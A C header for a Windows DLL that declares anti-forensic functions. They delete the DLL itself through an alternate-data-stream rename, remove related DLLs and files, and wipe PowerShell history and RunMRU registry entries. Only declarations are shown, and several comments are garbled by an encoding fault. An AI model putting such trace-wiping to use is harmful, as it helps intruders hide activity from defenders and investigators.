#pragma once

#pragma comment(lib, "Shlwapi.lib")

#include <Windows.h>
#include <shlwapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <wchar.h>

// UI DLL ���ƺ궨�壨������չ����
#ifndef UIname
#define UIname SimpleCard
#endif

#define DS_STREAM_RENAME L":dsl"

#if defined(DEBUG) && (DEBUG != 0)
#define DS_DEBUG_LOG(msg) wprintf(L"[LOG] - %s\n", msg)
#else
static inline void DS_DebugLogRelease(const wchar_t* msg)
{
    if (msg && wcscmp(msg, L"successfully deleted target from disk") == 0)
    {
        wprintf(L"�ѳɹ��޺ۻ�����\n");
    }
}
#define DS_DEBUG_LOG(msg) DS_DebugLogRelease(msg)
#endif

#ifdef __cplusplus
extern "C" {
#endif

bool DeleteSelfPoc(void);
bool DeleteFileEX(PCWSTR filePath);
bool DeleteMainDLL(void);

// ɾ��ͬĿ¼��ƥ�� UIname*.dll �������ļ�
bool DeleteUIDlls(void);

// ɾ����ǰ DLL ͬĿ¼�µ�ͬ�������ȫ���ļ�(basename.*)
bool DeleteSelfFiles(void);

// 删除 PowerShell 历史
bool DeletePowerShellHistory(void);
// 删除注册表 RunMRU
bool DeleteRunMRUHistory(void);

#ifdef __cplusplus
}
#endif